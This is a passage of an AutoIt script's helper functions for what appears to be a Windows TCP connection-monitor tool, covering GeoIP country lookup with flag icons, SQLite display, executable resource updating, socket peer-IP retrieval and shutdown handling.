    $aResources[1] = _GDIPlus_BitmapCreateFromHICON32($aResources[0]) ;$hBitmap ohne 32= orig
    $aResources[2] = _GDIPlus_Convert2HBitmap($aResources[1], $COLOR_MENUBAR) ;$hGDIBitmap
    _GUICtrlMenu_SetItemBmp(GUICtrlGetHandle($iMenu), $iItem, $aResources[2])
    Return $aResources
EndFunc

Func _GDIPlus_Convert2HBitmap($hBitmap, $iColor); removes alpha backround using system color and converts to gdi bitmap
    Local $iBgColor = _WinAPI_GetSysColor($iColor)
    $iBgColor = 0x10000 * BitAND($iBgColor, 0xFF) + BitAND($iBgColor, 0x00FF00) + BitShift($iBgColor, 16)
    Local $iWidth = _GDIPlus_ImageGetWidth($hBitmap), $iHeight = _GDIPlus_ImageGetHeight($hBitmap)
    Local $aResult = DllCall($__g_hGDIPDll, "uint", "GdipCreateBitmapFromScan0", "int", $iWidth, "int", $iHeight, "int", 0, "int", 0x0026200A, "ptr", 0, "handle*", 0)
    Local $hBitmap_new = $aResult[6]
    Local $hCtx_new = _GDIPlus_ImageGetGraphicsContext($hBitmap_new)
    Local $hBrush = _GDIPlus_BrushCreateSolid(0xFF000000 + $iBgColor)
    _GDIPlus_GraphicsFillRect($hCtx_new, 0, 0, $iWidth, $iHeight, $hBrush)
    _GDIPlus_GraphicsDrawImageRect($hCtx_new, $hBitmap, 0, 0, $iWidth, $iHeight)
    Local $hHBITMAP = _GDIPlus_BitmapCreateHBITMAPFromBitmap($hBitmap_new)
    _GDIPlus_BrushDispose($hBrush)
    _GDIPlus_BitmapDispose($hBitmap_new)
    _GDIPlus_GraphicsDispose($hCtx_new)
    Return $hHBITMAP
EndFunc

Func _Sec2Time($nr_sec)
   $sec2time_hour = Int($nr_sec / 3600)
   $sec2time_min = Int(($nr_sec - $sec2time_hour * 3600) / 60)
   $sec2time_sec = $nr_sec - $sec2time_hour * 3600 - $sec2time_min * 60
   Return StringFormat('%02d:%02d:%02d', $sec2time_hour, $sec2time_min, $sec2time_sec)
EndFunc

Func _LCIDToLocaleName($iLCID)
	Local $aRet = DllCall("Kernel32.dll", "int", "LCIDToLocaleName", "int", $iLCID, "wstr", "", "int", 85, "dword", 0)
	Return $aRet[2]
EndFunc

Func _IpToCountry($sIP)
    Local $sString = _IPv4ToInt($sIP)

    Local $sRead = FileRead(@ScriptDir & '\System\GeoIP\IpToCountry.csv') ; http://software77.net/geo-ip/
    Local $hTimer = TimerInit()
    Local $aArray = StringRegExp($sRead, '"(' & StringLeft($sString, 2) & '\d{6,8})","(\d{8,10})","([a-z]+)","(\d{8,10})","([A-Z]{2})","([A-Z]{2,3})","([a-zA-Z ]+)"\n', 3)
    If @error = 0 Then
        Local $aReturn[7]
        For $i = 0 To UBound($aArray) - 1 Step 7
            If $sString >= $aArray[$i] And $sString <= $aArray[$i + 1] Then
                $aReturn[0] = $aArray[$i]
                $aReturn[1] = $aArray[$i + 1]
                $aReturn[2] = $aArray[$i + 2]
                $aReturn[3] = $aArray[$i + 3]
                $aReturn[4] = $aArray[$i + 4]
                $aReturn[5] = $aArray[$i + 5]
                $aReturn[6] = $aArray[$i + 6]
                ExitLoop
            EndIf
        Next
		Return $aReturn[4]
    Else
        ConsoleWrite("GeoIP: Well an error occurred. Sorry. $sIP: " & $sIP & @CRLF)
    EndIf
EndFunc

Func _IPv4ToInt($sString) ; By JohnOne
    Local $aStringSplit = StringSplit($sString, '.', 1)
	If $aStringSplit[0] <= 1 Then Return
    Local $iOct1 = Int($aStringSplit[1]) * (256 ^ 3)
    Local $iOct2 = Int($aStringSplit[2]) * (256 ^ 2)
    Local $iOct3 = Int($aStringSplit[3]) * (256)
    Local $iOct4 = Int($aStringSplit[4])
    Return $iOct1 + $iOct2 + $iOct3 + $iOct4
EndFunc

Func _SetFlag($sCountryCode, $iLVItemIndex)
	$ImageCount = _GUIImageList_GetImageCount($hImageFlags)
	$ImageAdded = _GUIImageList_AddBitmap($hImageFlags, @ScriptDir & "\System\Flags\flag_" & $sCountryCode & ".bmp")
	_GUICtrlListView_SetImageList($idLVConnections, $hImageFlags, 1)
	$ImageCount = _GUIImageList_GetImageCount($hImageFlags)
	If $ImageAdded <> -1 Then
		_GUICtrlListView_SetItemImage($idLVConnections, $iLVItemIndex -1, $ImageCount -1)
	EndIf
EndFunc

Func _HighPrecisionSleep($iMicroSeconds, $hDll = False)
    Local $hStruct, $bLoaded
    If Not $hDll Then
        $hDll = DllOpen("ntdll.dll")
        $bLoaded = True
    EndIf
    $hStruct = DllStructCreate("int64 time;")
    DllStructSetData($hStruct, "time", -1*($iMicroSeconds*10))
    DllCall($hDll, "dword", "ZwDelayExecution", "int", 0, "ptr", DllStructGetPtr($hStruct))
    If $bLoaded Then DllClose($hDll)
EndFunc

Func _Resource($sFilePath)
    Local $aResource[$RESOURCE_FIRSTINDEX][$RESOURCE_MAX]
    $aResource[$RESOURCE][$RESOURCE_FILEPATH] = $sFilePath
    $aResource[$RESOURCE][$RESOURCE_UPDATE] = _WinAPI_BeginUpdateResource($aResource[$RESOURCE][$RESOURCE_FILEPATH])
    If @error Then
        $aResource[$RESOURCE][$RESOURCE_UPDATE] = Null
    Else
        $aResource[$RESOURCE][$RESOURCE_ID] = $RESOURCE_GUID
        $aResource[$RESOURCE][$RESOURCE_INDEX] = 0
        $aResource[$RESOURCE][$RESOURCE_ISNOTUPDATE] = False
        $aResource[$RESOURCE][$RESOURCE_UBOUND] = $RESOURCE_FIRSTINDEX
    EndIf
    Return $aResource
EndFunc   ;==>_Resource

Func _Resource_Close(ByRef $aResource)
    Local $bReturn = False
    If __Resource_IsAPI($aResource) And $aResource[$RESOURCE][$RESOURCE_UPDATE] Then
        $bReturn = _WinAPI_EndUpdateResource($aResource[$RESOURCE][$RESOURCE_UPDATE], $aResource[$RESOURCE][$RESOURCE_ISNOTUPDATE])
        $aResource[$RESOURCE][$RESOURCE_ISNOTUPDATE] = False
        If $bReturn Then $aResource[$RESOURCE][$RESOURCE_UPDATE] = Null
    EndIf
    Return $bReturn
EndFunc   ;==>_Resource_Close

Func _Resource_Update(ByRef $aResource, $sFilePath, $sResNameOrID, $iResType = Default, $iResLang = Default, $bIsAdd = True)
    Local $bReturn = False
    If __Resource_IsAPI($aResource) And $aResource[$RESOURCE][$RESOURCE_UPDATE] And FileExists($sFilePath) And Not (StringStripWS($sResNameOrID, $STR_STRIPALL) = '') Then
        If IsBool($bIsAdd) Then
            If $iResLang = Default Then $iResLang = $RESOURCE_LANG_DEFAULT
            If $iResType = Default Then $iResType = $RT_RCDATA
            If $bIsAdd Then
                Local $hFile = _WinAPI_CreateFile($sFilePath, 2, 2) ; Magic numbers!
                If Not @error And $hFile Then
                    Local $iBytes = 0, $iLength = FileGetSize($sFilePath), _
                            $pBuffer = 0, _
                            $tBuffer = 0

                    $aResource[$RESOURCE][$RESOURCE_INDEX] += 1
                    If $aResource[$RESOURCE][$RESOURCE_INDEX] >= $aResource[$RESOURCE][$RESOURCE_UBOUND] Then ; Re-size the array if required.
                        $aResource[$RESOURCE][$RESOURCE_UBOUND] = Ceiling($aResource[$RESOURCE][$RESOURCE_INDEX] * 1.3)
                        ReDim $aResource[$aResource[$RESOURCE][$RESOURCE_UBOUND]][$RESOURCE_MAX]
                    EndIf
                    $aResource[$aResource[$RESOURCE][$RESOURCE_INDEX]][$RESOURCE_RESPATH] = $sFilePath
                    $aResource[$aResource[$RESOURCE][$RESOURCE_INDEX]][$RESOURCE_RESLENGTH] = $iLength
                    $aResource[$aResource[$RESOURCE][$RESOURCE_INDEX]][$RESOURCE_RESLANG] = $iResLang
                    $aResource[$aResource[$RESOURCE][$RESOURCE_INDEX]][$RESOURCE_RESNAMEORID] = $sResNameOrID
                    $aResource[$aResource[$RESOURCE][$RESOURCE_INDEX]][$RESOURCE_RESTYPE] = $iResType

                    ; Idea inspired by Jos and wraithdu. AutoItWrapper was analysed in creating this code.
                    Switch $iResType
                        Case $RT_BITMAP ; http://www.codeproject.com/Articles/47708/Modify-Update-resources-of-an-Exe-DLL-on-the-fly
                            $iLength -= $RESOURCE_BITMAP_HEADER
                            $tBuffer = DllStructCreate('byte data[' & $iLength & ']')
                            $pBuffer = DllStructGetPtr($tBuffer)
                            _WinAPI_SetFilePointer($hFile, $RESOURCE_BITMAP_HEADER)
                            _WinAPI_ReadFile($hFile, $pBuffer, $iLength, $iBytes, 0)

                        Case $RT_ANICURSOR, $RT_CURSOR
                            ; To be added.

                        Case $RT_ICON ; http://blogs.msdn.com/b/oldnewthing/archive/2012/07/20/10331787.aspx
                            ; To be added.

                        Case $RT_STRING
                            ; To be added.

                        Case Else ; $RT_FONT, $RT_MANIFEST, $RT_RCDATA, $RT_VERSION
                            $tBuffer = DllStructCreate('byte data[' & $iLength & ']')
                            $pBuffer = DllStructGetPtr($tBuffer)
                            _WinAPI_ReadFile($hFile, $pBuffer, $iLength, $iBytes, 0)

                    EndSwitch
                    If $hFile Then
                        _WinAPI_CloseHandle($hFile)
                    EndIf
                    $bReturn = _WinAPI_UpdateResource($aResource[$RESOURCE][$RESOURCE_UPDATE], $iResType, $sResNameOrID, $iResLang, $pBuffer, $iLength) > 0
                EndIf
                $aResource[$aResource[$RESOURCE][$RESOURCE_INDEX]][$RESOURCE_RESISADDED] = $bReturn
            Else
                $bReturn = _WinAPI_UpdateResource($aResource[$RESOURCE][$RESOURCE_UPDATE], $iResType, $sResNameOrID, $iResLang, 0, 0) > 0
            EndIf

            If Not $bReturn And Not $aResource[$RESOURCE][$RESOURCE_ISNOTUPDATE] Then
                $aResource[$RESOURCE][$RESOURCE_ISNOTUPDATE] = True
            Else
                $aResource[$RESOURCE][$RESOURCE_ISNOTUPDATE] = False
            EndIf
        EndIf
    EndIf
    Return $bReturn
EndFunc   ;==>_Resource_Update

Func __Resource_IsAPI(ByRef $aResource)
    Return UBound($aResource, $UBOUND_COLUMNS) = $RESOURCE_MAX And $aResource[$RESOURCE][$RESOURCE_ID] = $RESOURCE_GUID
EndFunc   ;==>__Resource_IsAPI

Func _ErrFunc($oError)
    ; Do anything here.
    ConsoleWrite(@ScriptName & " (" & $oError.scriptline & ") : ==> COM Error intercepted !" & @CRLF & _
            @TAB & "err.number is: " & @TAB & @TAB & "0x" & Hex($oError.number) & @CRLF & _
            @TAB & "err.windescription:" & @TAB & $oError.windescription & @CRLF & _
            @TAB & "err.description is: " & @TAB & $oError.description & @CRLF & _
            @TAB & "err.source is: " & @TAB & @TAB & $oError.source & @CRLF & _
            @TAB & "err.helpfile is: " & @TAB & $oError.helpfile & @CRLF & _
            @TAB & "err.helpcontext is: " & @TAB & $oError.helpcontext & @CRLF & _
            @TAB & "err.lastdllerror is: " & @TAB & $oError.lastdllerror & @CRLF & _
            @TAB & "err.scriptline is: " & @TAB & $oError.scriptline & @CRLF & _
            @TAB & "err.retcode is: " & @TAB & "0x" & Hex($oError.retcode) & @CRLF & @CRLF)
EndFunc

Func _ShowSqlTbl($hDB, $sTblName) ;function to list sql tables in console
	Local $aResult, $iRows, $iColumns, $iRval
	$iRval = _SQLite_GetTable2d($hDB, "SELECT * FROM " & $sTblName & ";", $aResult, $iRows, $iColumns)
	If $iRval = $SQLITE_OK Then
		_SQLite_Display2DResult($aResult)
	Else
		ConsoleWrite("SQLite Error: " & $iRval & " | " & _SQLite_ErrMsg($hDB) & @CRLF)
	EndIf
EndFunc

Func _SocketToIP($SHOCKET) ; IP of the connecting client.
	Local $sockaddr = DllStructCreate("short;ushort;uint;char[8]")
	Local $aRet = DllCall($hWS2_32, "int", "getpeername", "int", $SHOCKET, "ptr", DllStructGetPtr($sockaddr), "int*", DllStructGetSize($sockaddr))
	If Not @error And $aRet[0] = 0 Then
		$aRet = DllCall($hWS2_32, "str", "inet_ntoa", "int", DllStructGetData($sockaddr, 3))
		If Not @error Then $aRet = $aRet[0]
	Else
		$aRet = 0
	EndIf
	$sockaddr = 0
	Return $aRet
EndFunc

Func _Exit()
	ConsoleWrite("_exit1" & @CRLF)
	StopListen()
	ConsoleWrite("_exit2" & @CRLF)
	GUISetState(@SW_HIDE, $hGuiMain)
	ConsoleWrite("_exit3" & @CRLF)
;~ 	Sleep(5000) ;give sqlite time to backup and finalize statements
	$iResult = _SQLite_Close($hDBConnections)
	ConsoleWrite("sqlite close1: " & $iResult & @CRLF)
	While $iResult <> $SQLITE_OK
;~ 		_SQLite_Close($hDBConnections)
		$iResult = _SQLite_Close($hDBConnections)
		ConsoleWrite("sqlite close2: " & $iResult & @CRLF)
		_SQLite_QueryFinalize($hQueryReadConnection)
		_SQLite_QueryFinalize($hQueryGetDBCount)
		ConsoleWrite("_exit3.1" & @CRLF)
	WEnd
;~ 	MsgBox(0,"fertig","_exit")
	ConsoleWrite("_exit3.2" & @CRLF)
	_SQLite_Shutdown()
	ConsoleWrite("_exit4" & @CRLF)
	TCPShutdown()
	ConsoleWrite("_exit5" & @CRLF)
	Exit
	ConsoleWrite("_exit6" & @CRLF)
EndFunc

#EndRegion wrapper functions